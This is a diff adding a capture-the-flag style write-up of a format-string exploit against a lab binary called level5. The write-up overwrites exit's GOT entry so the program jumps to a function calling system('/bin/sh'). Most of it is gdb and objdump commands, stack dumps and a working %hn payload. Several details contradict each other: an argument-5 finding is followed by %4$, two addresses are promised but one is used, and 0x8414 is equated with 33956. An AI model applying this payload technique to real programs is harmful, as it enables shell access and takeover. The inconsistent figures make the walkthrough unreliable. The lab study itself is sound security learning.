@@ -1,0 +1,405 @@
+first i disassemble `main` using:
+
+```bash
+echo 'disas main' | gdb level5
+```
+
+the `main` function only does:
+
+```asm
+0x0804850a <+6>: call 0x80484c2 <n>
+```
+
+so all the interesting logic is inside `n()`.
+
+## Analyzing n()
+
+i disassemble `n()` using:
+
+```bash
+echo 'disas n' | gdb level5
+```
+
+i see that the function:
+
+- allocates local buffer space with:
+
+```asm
+sub esp, 0x10
+```
+
+- reads user input using:
+
+```c
+fgets(buffer, 0x200, stdin);
+```
+
+- prints the input using:
+
+```c
+printf(buffer);
+```
+
+this is exactly like the previous level.
+
+user input is used directly as a format string:
+
+```c
+printf(buffer);
+```
+
+that means i control how `printf()` behaves.
+
+---
+
+i search for a call to `system()` in the disassembly and find it inside the function:
+
+```asm
+0x080484a4 <o>
+```
+
+the function `o()` contains:
+
+```c
+system("/bin/sh");
+```
+
+but `o()` is never called during normal execution.
+
+this time i need to control the EIP register to jump to `o()`.
+
+---
+
+## Looking for Another Target
+
+i first think about overwriting the return address, but this is not possible because there is no buffer overflow.
+
+the only thing i control is the format string passed to `printf()`.
+
+i continue reading the disassembly and notice that before the program terminates it executes:
+
+```asm
+call 0x80483d0 <exit@plt>
+```
+
+if i can redirect this call somewhere else, i gain control.
+
+so instead of overwriting a return address, i decide to overwrite the GOT entry of `exit()` and replace it with the address of `o()`.
+
+then when the program executes:
+
+```c
+exit();
+```
+
+it will actually jump to:
+
+```c
+o();
+```
+
+which will execute:
+
+```c
+system("/bin/sh");
+```
+
+---
+
+## Researching Format String Attacks
+
+after searching on the internet about format string attacks, i find that `%n` allows writing to an arbitrary memory address.
+
+the value written by `%n` is the number of characters printed so far.
+
+therefore if i can:
+
+1. place an address on the stack
+2. print a controlled number of characters
+3. execute `%n`
+
+then i can write a chosen value to a chosen address.
+
+---
+
+## Finding exit@got
+
+i search for the GOT address of `exit()` using:
+
+```bash
+objdump -R level5
+```
+
+and find:
+
+```text
+08049838 R_386_JUMP_SLOT exit
+```
+
+meaning:
+
+```text
+exit@got = 0x08049838
+```
+
+---
+
+## Finding My Stack Position
+
+now i need to know where my input appears on the stack.
+
+i print stack values using:
+
+```bash
+python -c 'print "AAAAAAAA" + " %x"*20' | ./level5
+```
+
+and obtain:
+
+```text
+1 -> 200
+2 -> b7fd1ac0
+3 -> b7ff37d0
+4 -> 41414141
+5 -> 41414141
+6 -> 20782520
+```
+
+here i can see that the first bytes read by `fgets()` appear at argument 5.
+
+therefore i can reference them using:
+
+```text
+%4$
+```
+
+and use `%4$n` to perform a write.
+
+---
+
+## Writing the Address of o()
+
+the address of `o()` is:
+
+```text
+0x080484a4
+```
+
+which in decimal is:
+
+```text
+134513828
+```
+
+my first idea is to write:
+
+```c
+printf("%134513828(character)%4$n");
+```
+
+so that `%n` stores:
+
+```text
+134513828
+```
+
+at the target address.
+
+---
+
+## Hitting the fgets Limit
+
+the problem is that `fgets()` only reads:
+
+```asm
+movl $0x200, 0x4(%esp)
+```
+
+which means:
+
+```text
+512 bytes maximum
+```
+
+even if i try:
+
+```bash
+python -c 'print "A"*134513828' | ./level5 | wc -c
+```
+
+i only get:
+
+```text
+511
+```
+
+characters.
+
+so i cannot send 134 million characters directly.
+
+---
+
+## Researching Another Way
+
+after searching on the internet again, i find that width specifiers can increase the number of printed characters without increasing the input size.
+
+for example:
+
+```c
+printf("%4s", "hi");
+```
+
+prints:
+
+```text
+|  hi
+```
+
+which is 4 characters in total.
+
+using the same idea:
+
+```c
+printf("%134513828x");
+```
+
+causes `printf()` to generate 134,513,828 output characters.
+
+therefore `%n` will store:
+
+```text
+134513828
+```
+
+even though my payload is small.
+
+to verify this, i create a small C program:
+
+```c
+#include <stdio.h>
+
+int main()
+{
+    unsigned int n;
+
+    printf("%134513828x%n", &n, &n);
+    printf("n = %u\n", n);
+
+    return 0;
+}
+```
+
+the output is:
+
+```text
+bc917188
+n = 134513828
+```
+
+which confirms that `%n` stores the number of printed characters.
+
+---
+
+## Preparing the GOT Overwrite
+
+after reading more about format string exploitation, i find that writing the whole 4-byte value at once is not practical.
+it cause performance issuce
+
+instead i split the target value into two parts:
+
+```text
+0x080484a4
+
+lower 2 bytes = 0x84a4
+upper 2 bytes = 0x0804
+```
+
+the payload begins with:
+
+```text
+\x3a\x98\x04\x08
+\x38\x98\x04\x08
+```
+
+which correspond to:
+
+```text
+exit@got + 2
+exit@got
+```
+
+then i use `%hn` to write the lower and upper halves separately.
+
+From the previous stack analysis, the first address is at position 5 and the second at position 6.
+
+as i notice the two addresses of Got and o() function start with 0x0804
+so i dont need to change the first two bytes of got pointer
+
+The final payload is:
+
+```bash
+python -c 'print "\x38\x98\x04\x08%33952d%4$hn"' > /tmp/payload
+```
+
+Explanation:
+
+```text
+4 bytes
+```
+
+are already printed by the two addresses.
+
+To write:
+
+```text
+0x8414 = 33956
+```
+
+to `exit@got`, i need:
+
+```text
+33956 - 4 = 33952
+```
+
+---
+
+## Verifying the Overwrite
+
+i verify the GOT overwrite using:
+
+```bash
+echo -e "b *0x080484f8\n\
+x/x 0x08049838\n\
+run </tmp/payload >/tmp/out\n\
+x/x 0x08049838" | gdb level5
+```
+
+before execution, the GOT entry points to `exit()`.
+
+after the format string attack, the GOT entry contains:
+
+```text
+0x080484a4
+```
+
+which is the address of `o()`.
+
+when the program finally executes:
+
+```c
+exit();
+```
+
+execution is redirected to:
+
+```c
+o();
+```
+
+which calls:
+
+```c
+system("/bin/sh");
+```
+
+and gives a shell.
